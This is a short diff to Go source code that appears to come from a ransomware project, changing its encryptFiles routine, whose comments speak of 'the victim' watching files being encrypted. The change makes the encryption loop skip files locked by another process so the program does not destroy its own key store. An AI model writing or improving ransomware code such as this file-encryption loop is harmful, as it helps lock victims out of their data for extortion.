@@ -207,6 +207,14 @@ func encryptFiles() {
 
 					cmd.Logger.Printf("Encrypting %s...\n", file.Path)
 
+					// Skip files currently locked by another process (e.g. the
+					// server's database.db), so the demo can't destroy its own
+					// key store while the server is running
+					if utils.FileIsLocked(file.Path) {
+						cmd.Logger.Printf("Skipping locked file %s\n", file.Path)
+						continue
+					}
+
 					// We need make a temporary copy of the file for store the encrypted content
 					// before move then to the original file
 					// This is necessary because if has many files the victim can observe the
